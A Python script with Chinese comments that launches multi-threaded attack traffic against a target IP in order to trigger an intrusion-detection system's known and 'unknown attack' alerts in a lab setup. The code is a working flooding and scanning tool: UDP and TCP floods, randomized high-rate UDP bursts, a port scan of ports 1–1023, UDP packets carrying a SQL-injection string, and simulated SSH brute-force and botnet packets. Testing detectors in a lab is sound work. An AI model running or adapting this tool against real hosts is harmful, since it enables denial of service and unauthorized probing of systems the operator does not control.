#!/usr/bin/env python3
"""
多模态攻击脚本（含未知异常流量生成）

用途：
    1. 复现已知攻击（方便验证已知告警）
    2. 生成具有异常模式但未被签名覆盖的流量，触发“Unknown Attack (UA)”

使用说明：
    - 默认攻击 30 秒，可通过 --duration 参数调节
    - TARGET_IP 默认 192.168.109.151，可通过命令行参数覆盖
    - 需要在攻击机（如虚拟机）上运行，目标为物理机 IP
"""
import argparse
import random
import socket
import threading
import time
from dataclasses import dataclass, field


DEFAULT_TARGET = "192.168.31.87"
DEFAULT_DURATION = 35

# 未知攻击使用的端口范围（与检测端的已知端口库错开）
UNKNOWN_UDP_PORTS = list(range(45000, 45020))
UNKNOWN_MIX_PORTS = list(range(47000, 47010))


@dataclass
class AttackStats:
    known_udp: int = 0
    known_tcp: int = 0
    unknown_udp: int = 0
    unknown_mixed: int = 0
    start_time: float = field(default_factory=time.time)

    def summary(self):
        elapsed = time.time() - self.start_time
        lines = [
            f"🕒 运行时长：{elapsed:.1f}s",
            f"✅ 已知UDP洪泛：{self.known_udp:,} 包",
            f"✅ 已知TCP SYN洪泛：{self.known_tcp:,} 包",
            f"🆕 未知高熵UDP：{self.unknown_udp:,} 包",
            f"🆕 未知混合波形：{self.unknown_mixed:,} 包",
        ]
        return "\n".join(lines)


stats = AttackStats()


def _create_udp_socket(src_port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", src_port))
    return sock


def known_udp_flood(target_ip: str, duration: int):
    """与原脚本一致的 UDP Flood，确保触发已知 DDoS 告警"""
    src_port = 50000
    dst_port = 80
    payload = random._urandom(1024)
    sock = _create_udp_socket(src_port)
    end_time = time.time() + duration
    print(f"[已知] UDP Flood -> {target_ip}:{dst_port} (src {src_port})")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (target_ip, dst_port))
            stats.known_udp += 1
            time.sleep(0.005)
    finally:
        sock.close()


def known_tcp_syn_flood(target_ip: str, duration: int):
    """固定源端口范围的 TCP SYN 洪泛，触发已知 DoS 告警"""
    base_src_port = 50010
    dst_port = 80
    end_time = time.time() + duration
    idx = 0
    print(f"[已知] TCP SYN Flood -> {target_ip}:{dst_port} (src 50010-50014)")
    while time.time() < end_time:
        src_port = base_src_port + (idx % 5)
        idx += 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.05)
            sock.bind(("", src_port))
            sock.connect((target_ip, dst_port))
            sock.close()
        except OSError:
            pass
        finally:
            stats.known_tcp += 1
            time.sleep(0.003)


def unknown_high_entropy_udp(target_ip: str, duration: int):
    """
    未知类型：向高位端口喷射不同大小、不同间隔的 UDP 包
    - 源端口 56000，避免命中已知签名
    - 每个目标端口一次发送 48~64 包（>=32，保证可检测）
    """
    src_port = 56000
    sock = _create_udp_socket(src_port)
    end_time = time.time() + duration
    print(f"[未知] 高频高熵UDP -> {target_ip}:45000-45019 (src {src_port})")
    try:
        while time.time() < end_time:
            dst_port = random.choice(UNKNOWN_UDP_PORTS)
            burst = random.randint(48, 64)
            for _ in range(burst):
                payload = random._urandom(random.randint(400, 1500))
                sock.sendto(payload, (target_ip, dst_port))
                stats.unknown_udp += 1
                time.sleep(random.uniform(0.001, 0.003))  # 提高速率以触发异常检测 (>300pps)
            time.sleep(random.uniform(0.01, 0.02))
    finally:
        sock.close()


def unknown_mixed_wave(target_ip: str, duration: int):
    """
    未知类型：混合波形攻击
    - 在两个源端口之间切换
    - 交替使用小包/超大包+随机停顿
    - 目标端口 47000-47009
    """
    src_ports = [57000, 57001]
    sockets = {p: _create_udp_socket(p) for p in src_ports}
    end_time = time.time() + duration
    print(f"[未知] 混合波形UDP -> {target_ip}:47000-47009 (src 57000/57001)")
    try:
        while time.time() < end_time:
            src_port = random.choice(src_ports)
            sock = sockets[src_port]
            dst_port = random.choice(UNKNOWN_MIX_PORTS)
            burst = random.randint(36, 52)
            large_payload = random.choice([True, False])
            for _ in range(burst):
                size = random.randint(1200, 2000) if large_payload else random.randint(100, 300)
                payload = random._urandom(size)
                sock.sendto(payload, (target_ip, dst_port))
                stats.unknown_mixed += 1
                time.sleep(random.uniform(0.001, 0.003))  # 提高速率以触发异常检测
            time.sleep(random.uniform(0.02, 0.05))
    finally:
        for sock in sockets.values():
            sock.close()


def port_scan_attack(target_ip: str, duration: int):
    """端口扫描攻击 - 快速扫描大量端口"""
    src_port = 58000
    end_time = time.time() + duration
    print(f"[新增] Port Scan -> {target_ip}:1-1024 (src {src_port})")
    count = 0
    try:
        while time.time() < end_time:
            for dst_port in range(1, 1024):  # 扫描常用端口
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)  # 增加超时时间
                    sock.connect((target_ip, dst_port))
                    sock.send(b"SCAN")  # 发送数据
                    sock.close()
                except:
                    pass
                count += 1
                if time.time() >= end_time:
                    break
                time.sleep(0.001)  # 稍微延迟，让流量更明显
    finally:
        print(f"[Port Scan] 完成 {count} 次扫描")


def web_attack(target_ip: str, duration: int):
    """改为UDP政击 - 模拟Web流量"""
    src_port = 59000
    dst_port = 80
    end_time = time.time() + duration
    print(f"[新增] Web Attack -> {target_ip}:{dst_port} (src {src_port})")
    
    sock = _create_udp_socket(src_port)
    count = 0
    try:
        while time.time() < end_time:
            # 发送模拟HTTP请求的UDP包
            payload = b"GET /?id=1' OR '1'='1 HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
            sock.sendto(payload, (target_ip, dst_port))
            count += 1
            time.sleep(0.01)  # 增加频率
    finally:
        sock.close()
        print(f"[Web Attack] 发送 {count} 个恶意请求")


def brute_force_attack(target_ip: str, duration: int):
    """改为UDP政击 - 模拟SSH暴力破解"""
    src_port = 60000
    dst_port = 22  # SSH端口
    end_time = time.time() + duration
    print(f"[新增] Brute Force -> {target_ip}:{dst_port} (src {src_port})")
    
    sock = _create_udp_socket(src_port)
    count = 0
    try:
        while time.time() < end_time:
            # 发送模拟SSH登录尝试的UDP包
            payload = b"SSH-2.0-OpenSSH_7.4\r\nuser:admin\npass:" + str(count).encode()
            sock.sendto(payload, (target_ip, dst_port))
            count += 1
            time.sleep(0.02)
    finally:
        sock.close()
        print(f"[Brute Force] 尝试 {count} 次连接")


def infiltration_attack(target_ip: str, duration: int):
    """改为UDP政击 - 模拟渗透流量"""
    src_port = 61000
    dst_port = 443  # HTTPS端口
    end_time = time.time() + duration
    print(f"[新增] Infiltration -> {target_ip}:{dst_port} (src {src_port})")
    
    sock = _create_udp_socket(src_port)
    count = 0
    try:
        while time.time() < end_time:
            # 发送模拟慢速渗透的UDP包
            payload = b"A" * random.randint(100, 500)
            sock.sendto(payload, (target_ip, dst_port))
            count += 1
            time.sleep(0.05)
    finally:
        sock.close()
        print(f"[Infiltration] 完成 {count} 次渗透尝试")


def bot_attack(target_ip: str, duration: int):
    """僵尸网络攻击 - 模拟Bot流量"""
    src_port = 62000
    sock = _create_udp_socket(src_port)
    end_time = time.time() + duration
    print(f"[新增] Bot Attack -> {target_ip}:53 (src {src_port})")
    
    count = 0
    try:
        while time.time() < end_time:
            # 模拟DNS查询（Bot常见行为）
            payload = random._urandom(random.randint(50, 200))
            sock.sendto(payload, (target_ip, 53))
            count += 1
            time.sleep(random.uniform(0.01, 0.05))
    finally:
        sock.close()
        print(f"[Bot] 发送 {count} 个Bot包")


def run_attacks(target_ip: str, duration: int):
    threads = [
        threading.Thread(target=known_udp_flood, args=(target_ip, duration), daemon=True),
        threading.Thread(target=known_tcp_syn_flood, args=(target_ip, duration), daemon=True),
        threading.Thread(target=unknown_high_entropy_udp, args=(target_ip, duration), daemon=True),
        threading.Thread(target=unknown_mixed_wave, args=(target_ip, duration), daemon=True),
        threading.Thread(target=port_scan_attack, args=(target_ip, duration), daemon=True),
        threading.Thread(target=web_attack, args=(target_ip, duration), daemon=True),
        threading.Thread(target=brute_force_attack, args=(target_ip, duration), daemon=True),
        threading.Thread(target=infiltration_attack, args=(target_ip, duration), daemon=True),
        threading.Thread(target=bot_attack, args=(target_ip, duration), daemon=True),
    ]
    for t in threads:
        t.start()
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(5)
            print("\n--- 当前统计 ---")
            print(stats.summary())
    except KeyboardInterrupt:
        print("⚠️ 用户中断，正在收尾 ...")
    finally:
        for t in threads:
            t.join(timeout=3)
        print("\n=== 最终统计 ===")
        print(stats.summary())


def parse_args():
    parser = argparse.ArgumentParser(description="多类型攻击脚本（含未知流量）")
    parser.add_argument("target", nargs="?", default=DEFAULT_TARGET, help="被攻击的目标IP")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION, help="攻击时长，秒")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    print("=" * 70)
    print("🔥 混合攻击脚本（含未知流量 + 多种攻击类型）")
    print("=" * 70)
    print(f"🎯 目标IP: {args.target}")
    print(f"⏱️ 攻击时长: {args.duration}s")
    print(f"⚙️ 攻击类型: ")
    print(f"   ✅ 已知: UDP洪泛、TCP SYN洪泛")
    print(f"   🆕 未知: 高熵UDP、混合波形")
    print(f"   🔥 新增: 端口扫描、Web攻击、暴力破解、渗透攻击、僵尸网络")
    print("=" * 70)
    time.sleep(2)
    run_attacks(args.target, args.duration)

